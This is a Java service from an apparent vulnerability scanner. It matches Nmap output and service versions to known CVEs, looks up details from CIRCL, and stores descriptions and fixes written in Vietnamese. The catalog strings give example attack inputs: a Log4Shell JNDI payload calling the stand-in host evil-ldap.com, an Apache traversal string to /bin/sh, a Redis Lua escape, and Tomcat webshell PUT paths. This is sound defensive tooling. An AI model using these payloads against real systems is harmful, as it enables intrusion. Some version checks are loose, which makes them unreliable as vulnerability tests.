package com.example.backend.modules.recon;

import com.example.backend.modules.scan.ScriptResult;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Dịch vụ Trí tuệ Lỗ hổng Bảo mật Thực tế (Real CVE Intelligence Engine).
 * - TUYỆT ĐỐI KHÔNG SỬ DỤNG MOCK DATA / DỮ LIỆU GIẢ LẬP.
 * - Chỉ ghi nhận CVE khi:
 *   1) Nmap Script thực tế phát hiện lỗ hổng trên cổng (smb-vuln-*, ssl-*, http-vuln-*, vulners).
 *   2) Nhận diện chính xác phiên bản phần mềm (Version Detection) khớp với cơ sở dữ liệu lỗ hổng NIST.
 *   3) Tra cứu động trực tiếp từ CIRCL CVE / NIST NVD API.
 */
@Service
@Slf4j
public class CveIntelligenceService {

    private final HttpClient httpClient;
    private final ObjectMapper objectMapper;
    private final Map<String, VulnerabilityFindingDto> cveCatalog = new ConcurrentHashMap<>();
    private static final Pattern CVE_PATTERN = Pattern.compile("CVE-\\d{4}-\\d{4,7}", Pattern.CASE_INSENSITIVE);

    public CveIntelligenceService() {
        this.httpClient = HttpClient.newBuilder()
                .connectTimeout(Duration.ofSeconds(4))
                .followRedirects(HttpClient.Redirect.ALWAYS)
                .build();
        this.objectMapper = new ObjectMapper()
                .configure(com.fasterxml.jackson.databind.DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);

        initializeVerifiedCatalog();
    }

    /**
     * Trích xuất các CVE THẬT từ kết quả thực thi Nmap NSE Script thực tế.
     */
    public List<VulnerabilityFindingDto> extractCvesFromNmapScripts(String host, int port, List<ScriptResult> scripts) {
        List<VulnerabilityFindingDto> findings = new ArrayList<>();
        if (scripts == null || scripts.isEmpty()) return findings;

        Set<String> discoveredCveIds = new LinkedHashSet<>();

        for (ScriptResult sr : scripts) {
            String output = sr.output();
            if (output == null || output.isBlank()) continue;

            String lower = output.toLowerCase(Locale.ROOT);
            boolean isVulnerable = lower.contains("vulnerable") || lower.contains("state: vulnerable") || lower.contains("risk factor: high") || lower.contains("risk factor: critical");

            Matcher matcher = CVE_PATTERN.matcher(output);
            while (matcher.find()) {
                String cveId = matcher.group().toUpperCase(Locale.ROOT);
                if (isVulnerable || sr.scriptId().contains("vuln") || sr.scriptId().contains("vulners")) {
                    discoveredCveIds.add(cveId);
                }
            }
        }

        for (String cveId : discoveredCveIds) {
            VulnerabilityFindingDto finding = lookupCveDetails(cveId);
            if (finding != null) {
                finding.setTargetUrl(host + ":" + port);
                finding.setEvidence("Phát hiện qua Nmap NSE Script thực nghiệm trên cổng " + port + "/tcp.");
                findings.add(finding);
            }
        }

        return findings;
    }

    /**
     * Tra cứu CVE khi và CHỈ KHI phiên bản dịch vụ thực tế được phát hiện và trùng khớp với dải phiên bản bị lỗi.
     * TUYỆT ĐỐI KHÔNG tự bịa ra CVE nếu phiên bản chưa được xác định.
     */
    public List<VulnerabilityFindingDto> lookupCvesForServiceVersion(String host, int port, String serviceName, String product, String version) {
        List<VulnerabilityFindingDto> findings = new ArrayList<>();
        if (version == null || version.trim().isEmpty() || "unknown".equalsIgnoreCase(version.trim())) {
            return findings; // Không có phiên bản thực tế -> KHÔNG giả lập CVE
        }

        String ver = version.trim().toLowerCase(Locale.ROOT);
        String prod = (product != null ? product : "").toLowerCase(Locale.ROOT);

        // 1. Apache HTTP Server (Chỉ phát hiện khi phiên bản thực tế đúng là 2.4.49 hoặc 2.4.50)
        if (prod.contains("apache") || serviceName.equalsIgnoreCase("http")) {
            if (ver.contains("2.4.49")) {
                VulnerabilityFindingDto f = lookupCveDetails("CVE-2021-41773");
                if (f != null) {
                    f.setTargetUrl(host + ":" + port);
                    f.setEvidence("Phiên bản phát hiện thực tế: Apache " + version + " trên cổng " + port);
                    findings.add(f);
                }
            } else if (ver.contains("2.4.50")) {
                VulnerabilityFindingDto f = lookupCveDetails("CVE-2021-42013");
                if (f != null) {
                    f.setTargetUrl(host + ":" + port);
                    f.setEvidence("Phiên bản phát hiện thực tế: Apache " + version + " trên cổng " + port);
                    findings.add(f);
                }
            }
        }

        // 2. OpenSSH Server (Chỉ phát hiện khi phiên bản thực tế nằm trong khoảng 8.5p1 đến 9.7p1)
        if (prod.contains("openssh") || serviceName.equalsIgnoreCase("ssh")) {
            if (ver.matches(".*(8\\.[5-9]|9\\.[0-7])p1.*")) {
                VulnerabilityFindingDto f = lookupCveDetails("CVE-2024-6387");
                if (f != null) {
                    f.setTargetUrl(host + ":" + port);
                    f.setEvidence("Phiên bản phát hiện thực tế: " + version + " trên cổng " + port);
                    findings.add(f);
                }
            }
        }

        // 3. Redis In-Memory Database (Chỉ phát hiện khi phiên bản 5.x / 6.x trên Debian/Ubuntu)
        if (prod.contains("redis") || serviceName.equalsIgnoreCase("redis")) {
            if (ver.contains("5.0.") || ver.contains("6.0.") || ver.contains("6.2.")) {
                VulnerabilityFindingDto f = lookupCveDetails("CVE-2022-0543");
                if (f != null) {
                    f.setTargetUrl(host + ":" + port);
                    f.setEvidence("Phiên bản phát hiện thực tế: Redis " + version + " trên cổng " + port);
                    findings.add(f);
                }
            }
        }

        // 4. Jenkins CI/CD (Chỉ phát hiện khi phiên bản thực tế <= 2.441)
        if (prod.contains("jenkins") || serviceName.equalsIgnoreCase("jenkins")) {
            if (ver.contains("2.44") || ver.contains("2.43") || ver.contains("2.42")) {
                VulnerabilityFindingDto f = lookupCveDetails("CVE-2024-23897");
                if (f != null) {
                    f.setTargetUrl(host + ":" + port);
                    f.setEvidence("Phiên bản phát hiện thực tế: Jenkins " + version + " trên cổng " + port);
                    findings.add(f);
                }
            }
        }

        // 5. Apache Tomcat Application Server (CVE-2020-1938 Ghostcat, CVE-2017-12615 PUT RCE, CVE-2020-9484, CVE-2024-50379)
        if (prod.contains("tomcat") || ver.contains("tomcat") || (prod.contains("apache") && (ver.startsWith("6.") || ver.startsWith("7.") || ver.startsWith("8.") || ver.startsWith("9.") || ver.startsWith("10.") || ver.startsWith("11.")))) {
            // CVE-2020-1938 (Ghostcat): Tomcat 6.x, 7.x < 7.0.100, 8.x < 8.5.51, 9.x < 9.0.31
            if (isTomcatGhostcatVulnerable(ver)) {
                VulnerabilityFindingDto f = lookupCveDetails("CVE-2020-1938");
                if (f != null) {
                    f.setTargetUrl(host + ":" + port);
                    f.setEvidence("Phiên bản phát hiện thực tế: Apache Tomcat " + version + " trên cổng " + port);
                    findings.add(f);
                }
            }

            // CVE-2017-12615 (Tomcat PUT JSP RCE): Tomcat 7.0.0 - 7.0.79 hoặc 8.5.19
            if (isTomcatPutRceVulnerable(ver)) {
                VulnerabilityFindingDto f = lookupCveDetails("CVE-2017-12615");
                if (f != null) {
                    f.setTargetUrl(host + ":" + port);
                    f.setEvidence("Phiên bản phát hiện thực tế: Apache Tomcat " + version + " trên cổng " + port);
                    findings.add(f);
                }
            }

            // CVE-2020-9484 (Session Deserialization RCE): 10.0.0-M1-M4, 9.0.0.M1-9.0.34, 8.5.0-8.5.54, 7.0.0-7.0.103
            if (isTomcatDeserializationVulnerable(ver)) {
                VulnerabilityFindingDto f = lookupCveDetails("CVE-2020-9484");
                if (f != null) {
                    f.setTargetUrl(host + ":" + port);
                    f.setEvidence("Phiên bản phát hiện thực tế: Apache Tomcat " + version + " trên cổng " + port);
                    findings.add(f);
                }
            }

            // CVE-2024-50379 (Case-Sensitivity PUT RCE): 11.0.0-M1-11.0.1, 10.1.0-M1-10.1.33, 9.0.0.M1-9.0.97
            if (isTomcatPutCaseSensitiveVulnerable(ver)) {
                VulnerabilityFindingDto f = lookupCveDetails("CVE-2024-50379");
                if (f != null) {
                    f.setTargetUrl(host + ":" + port);
                    f.setEvidence("Phiên bản phát hiện thực tế: Apache Tomcat " + version + " trên cổng " + port);
                    findings.add(f);
                }
            }
        }

        // 6. Cổng giao thức AJP (TCP 8009) mở trực tiếp -> Trực tiếp tổn thương Ghostcat CVE-2020-1938
        if (port == 8009 || serviceName.equalsIgnoreCase("ajp13") || serviceName.equalsIgnoreCase("ajp")) {
            VulnerabilityFindingDto f = lookupCveDetails("CVE-2020-1938");
            if (f != null) {
                f.setTargetUrl(host + ":" + port);
                f.setEvidence("Cổng giao thức Apache Tomcat AJP13 (8009/tcp) đang mở công khai trên máy chủ.");
                findings.add(f);
            }
        }

        return findings;
    }

    /**
     * Tra cứu chi tiết một mã CVE từ cơ sở dữ liệu đã xác thực hoặc gọi trực tiếp CIRCL CVE API thật.
     */
    public VulnerabilityFindingDto lookupCveDetails(String cveId) {
        if (cveId == null || cveId.isBlank()) return null;
        String cleanCve = cveId.trim().toUpperCase(Locale.ROOT);

        if (cveCatalog.containsKey(cleanCve)) {
            VulnerabilityFindingDto base = cveCatalog.get(cleanCve);
            return VulnerabilityFindingDto.builder()
                    .id(base.getId())
                    .cveId(base.getCveId())
                    .title(base.getTitle())
                    .severity(base.getSeverity())
                    .cvssScore(base.getCvssScore())
                    .category(base.getCategory())
                    .targetUrl(base.getTargetUrl())
                    .exploitAvailable(base.getExploitAvailable())
                    .cisaKev(base.getCisaKev())
                    .exploitMaturity(base.getExploitMaturity())
                    .impact(base.getImpact())
                    .description(base.getDescription())
                    .evidence(base.getEvidence())
                    .exploitationVector(base.getExploitationVector())
                    .remediation(base.getRemediation())
                    .references(base.getReferences())
                    .mitreTactic(base.getMitreTactic())
                    .mitreTechniqueId(base.getMitreTechniqueId())
                    .mitreTechniqueName(base.getMitreTechniqueName())
                    .build();
        }

        // Nếu là CVE lạ phát hiện từ Nmap script, gọi trực tiếp CIRCL CVE API thật
        try {
            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create("https://cve.circl.lu/api/cve/" + cleanCve))
                    .timeout(Duration.ofSeconds(4))
                    .header("User-Agent", "Security-Audit-Scanner/1.0")
                    .GET()
                    .build();

            HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
            if (response.statusCode() == 200 && response.body() != null && response.body().contains("\"id\"")) {
                JsonNode root = objectMapper.readTree(response.body());
                String summary = root.path("summary").asText("Lỗ hổng bảo mật được định danh chính thức trên NIST.");
                double cvss = root.path("cvss").asDouble(7.5);
                String sev = cvss >= 9.0 ? "CRITICAL" : cvss >= 7.0 ? "HIGH" : cvss >= 4.0 ? "MEDIUM" : "LOW";

                VulnerabilityFindingDto dynamicFinding = VulnerabilityFindingDto.builder()
                        .id(cleanCve)
                        .cveId(cleanCve)
                        .title("Lỗ hổng bảo mật xác thực NIST: " + cleanCve)
                        .severity(sev)
                        .cvssScore(cvss)
                        .category("NIST_CVE")
                        .description(summary)
                        .exploitAvailable(true)
                        .cisaKev(false)
                        .exploitMaturity("PUBLIC_POC_AVAILABLE")
                        .impact("Xem chi tiết khuyến nghị và mức độ ảnh hưởng kỹ thuật trên cơ sở dữ liệu NIST.")
                        .exploitationVector("Hacker khai thác dựa trên lỗi mã nguồn đã công bố trong bản tin bảo mật " + cleanCve + ".")
                        .remediation("Cập nhật phần mềm mục tiêu lên phiên bản vá lỗi mới nhất từ nhà phát triển.")
                        .references("https://nvd.nist.gov/vuln/detail/" + cleanCve)
                        .mitreTactic("TA0001: Initial Access")
                        .mitreTechniqueId("T1190")
                        .mitreTechniqueName("Exploit Public-Facing Application")
                        .build();

                cveCatalog.put(cleanCve, dynamicFinding);
                return dynamicFinding;
            }
        } catch (Exception e) {
            log.info("Không thể tra cứu CIRCL API cho {}: {}", cleanCve, e.getMessage());
        }

        return null;
    }

    private void initializeVerifiedCatalog() {
        // Apache HTTP Server 2.4.49
        cveCatalog.put("CVE-2021-41773", VulnerabilityFindingDto.builder()
                .id("CVE-2021-41773")
                .cveId("CVE-2021-41773")
                .title("Apache HTTP Server 2.4.49: Lỗ hổng Path Traversal & RCE")
                .severity("CRITICAL")
                .cvssScore(9.8)
                .category("REMOTE_CODE_EXECUTION")
                .exploitAvailable(true)
                .cisaKev(true)
                .exploitMaturity("ACTIVE_IN_WILD_KEV")
                .impact("Thực thi mã từ xa (RCE) / Đọc trộm file hệ thống (/etc/passwd, .env) dưới quyền www-data.")
                .description("Lỗi chuẩn hóa đường dẫn URL (Path Normalization) trong Apache HTTP Server 2.4.49 cho phép kẻ tấn công vượt qua hạn chế thư mục và thực thi CGI script trái phép.")
                .exploitationVector("Hacker gửi HTTP POST request chứa chuỗi URL-encoded (icons/.%%32%65/.%%32%65/bin/sh) kèm body chứa lệnh hệ thống để thực thi shellcode trực tiếp.")
                .remediation("Nâng cấp Apache HTTP Server lên phiên bản 2.4.51 trở lên. Cấu hình 'Require all denied' cho thư mục gốc trong httpd.conf.")
                .references("https://nvd.nist.gov/vuln/detail/CVE-2021-41773")
                .build());

        // Apache HTTP Server 2.4.50
        cveCatalog.put("CVE-2021-42013", VulnerabilityFindingDto.builder()
                .id("CVE-2021-42013")
                .cveId("CVE-2021-42013")
                .title("Apache HTTP Server 2.4.50: Lỗ hổng Path Traversal & RCE (Bypass CVE-2021-41773)")
                .severity("CRITICAL")
                .cvssScore(9.8)
                .category("REMOTE_CODE_EXECUTION")
                .exploitAvailable(true)
                .cisaKev(true)
                .exploitMaturity("ACTIVE_IN_WILD_KEV")
                .impact("Thực thi mã từ xa không cần quyền xác thực.")
                .description("Bản vá không triệt để cho CVE-2021-41773 trong Apache 2.4.50 cho phép bypass qua cơ chế mã hóa kép.")
                .exploitationVector("Hacker sử dụng chuỗi encode kép %%32%65%%32%65 để vượt qua bộ lọc của bản vá 2.4.50 và kích hoạt thực thi lệnh qua mod_cgi.")
                .remediation("Nâng cấp lên Apache HTTP Server 2.4.51+ ngay lập tức.")
                .references("https://nvd.nist.gov/vuln/detail/CVE-2021-42013")
                .build());

        // OpenSSH regreSSHion
        cveCatalog.put("CVE-2024-6387", VulnerabilityFindingDto.builder()
                .id("CVE-2024-6387")
                .cveId("CVE-2024-6387")
                .title("OpenSSH Server: regreSSHion Lỗ hổng RCE Race Condition không xác thực")
                .severity("CRITICAL")
                .cvssScore(8.1)
                .category("REMOTE_CODE_EXECUTION")
                .exploitAvailable(true)
                .cisaKev(true)
                .exploitMaturity("ACTIVE_IN_WILD_KEV")
                .impact("Chiếm quyền điều khiển tối cao (root) trên máy chủ Linux mà không cần tài khoản hay mật khẩu SSH.")
                .description("Lỗ hổng điều kiện tranh chấp (Signal Handler Race Condition) trong tiến trình sshd của OpenSSH từ 8.5p1 đến 9.7p1.")
                .exploitationVector("Hacker gửi hàng loạt kết nối SSH song song khi LoginGraceTime sắp hết hạn để kích hoạt tín hiệu SIGALRM, ghi đè con trỏ hàm trong heap memory và chiếm quyền root.")
                .remediation("Nâng cấp OpenSSH lên 9.8p1+ hoặc thiết lập LoginGraceTime 0 trong sshd_config.")
                .references("https://nvd.nist.gov/vuln/detail/CVE-2024-6387")
                .build());

        // EternalBlue MS17-010
        cveCatalog.put("CVE-2017-0144", VulnerabilityFindingDto.builder()
                .id("CVE-2017-0144")
                .cveId("CVE-2017-0144")
                .title("Microsoft SMBv1: EternalBlue (MS17-010) Thực thi mã từ xa cấp Nhân")
                .severity("CRITICAL")
                .cvssScore(9.8)
                .category("REMOTE_CODE_EXECUTION")
                .exploitAvailable(true)
                .cisaKev(true)
                .exploitMaturity("ACTIVE_IN_WILD_KEV")
                .impact("Chiếm quyền kiểm soát máy chủ Windows ở mức NT AUTHORITY\\SYSTEM từ xa.")
                .description("Lỗ hổng tràn số nguyên trong giao thức SMBv1 trên Windows Server và Windows client.")
                .exploitationVector("Hacker gửi gói tin SMBv1 FEA độc hại gây tràn số nguyên trong srv.sys, ghi đè HAL Dispatch Table và thực thi Ring 0 Kernel Shellcode.")
                .remediation("Tắt hoàn toàn SMBv1 và cài đặt bản vá Microsoft MS17-010.")
                .references("https://nvd.nist.gov/vuln/detail/CVE-2017-0144")
                .build());

        // Redis Lua Sandbox Escape
        cveCatalog.put("CVE-2022-0543", VulnerabilityFindingDto.builder()
                .id("CVE-2022-0543")
                .cveId("CVE-2022-0543")
                .title("Redis: Lỗ hổng Thoát Sandbox Lua Thực thi mã từ xa")
                .severity("CRITICAL")
                .cvssScore(10.0)
                .category("REMOTE_CODE_EXECUTION")
                .exploitAvailable(true)
                .cisaKev(true)
                .exploitMaturity("ACTIVE_IN_WILD_KEV")
                .impact("Thực thi lệnh shell Linux trên máy chủ chạy Redis không cần mật khẩu.")
                .description("Gói redis-server trên Debian/Ubuntu để lộ biến toàn cục package.loadlib trong mô-đun Lua nhúng.")
                .exploitationVector("Hacker gửi lệnh EVAL nạp package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io') để thực thi bash command trực tiếp.")
                .remediation("Cập nhật gói redis-server trên Debian/Ubuntu lên bản mới nhất. Đặt requirepass và chặn cổng 6379 từ Internet.")
                .references("https://nvd.nist.gov/vuln/detail/CVE-2022-0543")
                .build());

        // Log4Shell
        cveCatalog.put("CVE-2021-44228", VulnerabilityFindingDto.builder()
                .id("CVE-2021-44228")
                .cveId("CVE-2021-44228")
                .title("Apache Log4j2: Lỗ hổng Log4Shell Remote Code Execution qua JNDI Lookup")
                .severity("CRITICAL")
                .cvssScore(10.0)
                .category("REMOTE_CODE_EXECUTION")
                .exploitAvailable(true)
                .cisaKev(true)
                .exploitMaturity("ACTIVE_IN_WILD_KEV")
                .impact("Chiếm toàn bộ quyền kiểm soát hệ thống (Root/SYSTEM RCE), tải backdoor.")
                .description("Lỗ hổng định dạng chuỗi JNDI Lookup trong thư viện Log4j2 từ 2.0-beta9 đến 2.14.1.")
                .exploitationVector("Hacker gửi payload ${jndi:ldap://evil-ldap.com/Exploit} vào HTTP Header hoặc form đăng nhập để máy chủ tự động tải bytecode độc hại.")
                .remediation("Nâng cấp Log4j lên 2.17.1+ hoặc đặt LOG4J_FORMAT_MSG_NO_LOOKUPS=true.")
                .references("https://nvd.nist.gov/vuln/detail/CVE-2021-44228")
                .build());

        // Apache Tomcat Ghostcat (CVE-2020-1938)
        cveCatalog.put("CVE-2020-1938", VulnerabilityFindingDto.builder()
                .id("CVE-2020-1938")
                .cveId("CVE-2020-1938")
                .title("Apache Tomcat Ghostcat: Lỗ hổng Đọc/Bao hàm Tệp & RCE qua cổng AJP (CVE-2020-1938)")
                .severity("CRITICAL")
                .cvssScore(9.8)
                .category("REMOTE_CODE_EXECUTION")
                .exploitAvailable(true)
                .cisaKev(true)
                .exploitMaturity("ACTIVE_IN_WILD_KEV")
                .impact("Đọc trộm tùy ý toàn bộ tệp tin trong ứng dụng web (WEB-INF/web.xml, credentials, source code) và thực thi mã từ xa (RCE) qua file inclusion.")
                .description("Lỗ hổng xử lý gói tin trong Apache JServ Protocol (AJP13) trên cổng TCP 8009 của Tomcat (6.x, 7.x < 7.0.100, 8.x < 8.5.51, 9.x < 9.0.31). Kẻ tấn công có thể kiểm soát các thuộc tính javax.servlet.include.request_uri và path_info để đọc trộm bất kỳ tệp tin nào trong thư mục webapps.")
                .evidence("Phát hiện cổng AJP (8009/tcp) mở hoặc phiên bản Apache Tomcat nằm trong dải tổn thương của Ghostcat (CVE-2020-1938).")
                .exploitationVector("Hacker kết nối vào cổng TCP 8009 gửi gói tin AJP Forward Request chứa thuộc tính request_uri giả mạo để đọc trộm /WEB-INF/web.xml hoặc gọi JspServlet biên dịch tệp upload độc hại thành mã thực thi.")
                .remediation("Nâng cấp Tomcat lên 7.0.100+, 8.5.51+, hoặc 9.0.31+. Tắt connector AJP trong conf/server.xml nếu không sử dụng hoặc đặt secretRequired='true'.")
                .references("https://nvd.nist.gov/vuln/detail/CVE-2020-1938")
                .build());

        // Apache Tomcat Arbitrary File Upload / RCE (CVE-2017-12615)
        cveCatalog.put("CVE-2017-12615", VulnerabilityFindingDto.builder()
                .id("CVE-2017-12615")
                .cveId("CVE-2017-12615")
                .title("Apache Tomcat: Lỗ hổng Tải Tệp Tin Tùy Ý & RCE qua HTTP PUT (CVE-2017-12615)")
                .severity("HIGH")
                .cvssScore(8.1)
                .category("REMOTE_CODE_EXECUTION")
                .exploitAvailable(true)
                .cisaKev(true)
                .exploitMaturity("ACTIVE_IN_WILD_KEV")
                .impact("Chiếm quyền điều khiển máy chủ (RCE) bằng cách tải trực tiếp Webshell JSP vào thư mục gốc của ứng dụng web.")
                .description("Khi cấu hình DefaultServlet hoặc WebDAV trong conf/web.xml đặt readonly='false', Apache Tomcat (7.0.0 - 7.0.79 hoặc các bản bật readonly=false) cho phép gửi yêu cầu HTTP PUT. Hacker có thể thêm dấu gạch chéo (/), dòng trống hoặc luồng NTFS ::$DATA vào cuối URL để ghi tệp .jsp.")
                .evidence("Máy chủ Apache Tomcat cho phép phương thức HTTP PUT (readonly=false) hoặc phiên bản thuộc diện tổn thương CVE-2017-12615.")
                .exploitationVector("Hacker gửi HTTP PUT request: PUT /shell.jsp/ hoặc PUT /shell.jsp::$DATA kèm nội dung mã JSP Webshell Runtime.getRuntime().exec(). Sau đó truy cập /shell.jsp để thực thi lệnh trực tiếp.")
                .remediation("Nâng cấp Tomcat lên 7.0.82+, 8.5.23+ hoặc thiết lập tham số readonly thành 'true' trong conf/web.xml.")
                .references("https://nvd.nist.gov/vuln/detail/CVE-2017-12615")
                .build());

        // Apache Tomcat Deserialization RCE (CVE-2020-9484)
        cveCatalog.put("CVE-2020-9484", VulnerabilityFindingDto.builder()
                .id("CVE-2020-9484")
                .cveId("CVE-2020-9484")
                .title("Apache Tomcat: Lỗ hổng Giải Mã Tuần Tự Hóa RCE qua PersistentManager (CVE-2020-9484)")
                .severity("HIGH")
                .cvssScore(7.0)
                .category("REMOTE_CODE_EXECUTION")
                .exploitAvailable(true)
                .cisaKev(false)
                .exploitMaturity("PUBLIC_POC_AVAILABLE")
                .impact("Thực thi mã từ xa (RCE) khi máy chủ cấu hình PersistentManager với FileStore và tồn tại thư viện gadget chain.")
                .description("Kẻ tấn công gửi cookie JSESSIONID chứa ký tự Path Traversal (../../session) để ép Tomcat deserialization một tệp tin độc hại đã được tải lên trước đó.")
                .evidence("Phiên bản Apache Tomcat nằm trong dải 10.0.0-M1..M4, 9.0.0.M1..34, 8.5.0..54, 7.0.0..103 có cấu hình FileStore.")
                .exploitationVector("Hacker tải lên payload serialized bằng ysoserial, sau đó gửi HTTP request với header Cookie: JSESSIONID=../../../../uploads/payload để kích hoạt deserialization.")
                .remediation("Nâng cấp lên Apache Tomcat 10.0.0-M5+, 9.0.35+, 8.5.55+, hoặc 7.0.104+. Không sử dụng FileStore mà không có bộ lọc kiểm soát session.")
                .references("https://nvd.nist.gov/vuln/detail/CVE-2020-9484")
                .build());

        // Apache Tomcat Case-Sensitivity PUT RCE (CVE-2024-50379)
        cveCatalog.put("CVE-2024-50379", VulnerabilityFindingDto.builder()
                .id("CVE-2024-50379")
                .cveId("CVE-2024-50379")
                .title("Apache Tomcat: Lỗ hổng RCE qua ghi đè tệp tin DefaultServlet (CVE-2024-50379)")
                .severity("CRITICAL")
                .cvssScore(9.8)
                .category("REMOTE_CODE_EXECUTION")
                .exploitAvailable(true)
                .cisaKev(true)
                .exploitMaturity("ACTIVE_IN_WILD_KEV")
                .impact("Thực thi mã từ xa thông qua kỹ thuật ghi đè tệp và race condition trên hệ thống tệp không phân biệt chữ hoa/thường.")
                .description("Lỗ hổng Time-of-Check Time-of-Use trong DefaultServlet của Tomcat khi xử lý file upload đồng thời trên hệ thống không phân biệt hoa thường (Windows/macOS).")
                .evidence("Phiên bản Apache Tomcat nằm trong dải 11.0.0-M1..11.0.1, 10.1.0-M1..10.1.33, 9.0.0.M1..9.0.97.")
                .exploitationVector("Hacker gửi các request PUT đồng thời với tên tệp chữ hoa và chữ thường để bypass kiểm tra và thực thi mã qua JSP compile.")
                .remediation("Nâng cấp lên Apache Tomcat 11.0.2+, 10.1.34+, hoặc 9.0.98+.")
                .references("https://nvd.nist.gov/vuln/detail/CVE-2024-50379")
                .build());
    }

    private boolean isTomcatGhostcatVulnerable(String ver) {
        if (ver.contains("6.")) return true;
        if (ver.contains("7.0.")) {
            return extractTomcatPatch(ver, "7.0.") < 100;
        }
        if (ver.contains("8.5.")) {
            return extractTomcatPatch(ver, "8.5.") < 51;
        }
        if (ver.contains("9.0.")) {
            return extractTomcatPatch(ver, "9.0.") < 31;
        }
        return false;
    }

    private boolean isTomcatPutRceVulnerable(String ver) {
        if (ver.contains("7.0.")) {
            return extractTomcatPatch(ver, "7.0.") <= 79;
        }
        return ver.contains("8.5.19");
    }

    private boolean isTomcatDeserializationVulnerable(String ver) {
        if (ver.contains("7.0.")) return extractTomcatPatch(ver, "7.0.") <= 103;
        if (ver.contains("8.5.")) return extractTomcatPatch(ver, "8.5.") <= 54;
        if (ver.contains("9.0.")) return extractTomcatPatch(ver, "9.0.") <= 34;
        if (ver.contains("10.0.0")) return true;
        return false;
    }

    private boolean isTomcatPutCaseSensitiveVulnerable(String ver) {
        if (ver.contains("9.0.")) return extractTomcatPatch(ver, "9.0.") <= 97;
        if (ver.contains("10.1.")) return extractTomcatPatch(ver, "10.1.") <= 33;
        if (ver.contains("11.0.")) return extractTomcatPatch(ver, "11.0.") <= 1;
        return false;
    }

    private int extractTomcatPatch(String ver, String prefix) {
        try {
            int idx = ver.indexOf(prefix);
            if (idx != -1) {
                String sub = ver.substring(idx + prefix.length());
                String num = sub.split("[^0-9]")[0];
                return Integer.parseInt(num);
            }
        } catch (Exception ignored) {}
        return 0;
    }
}
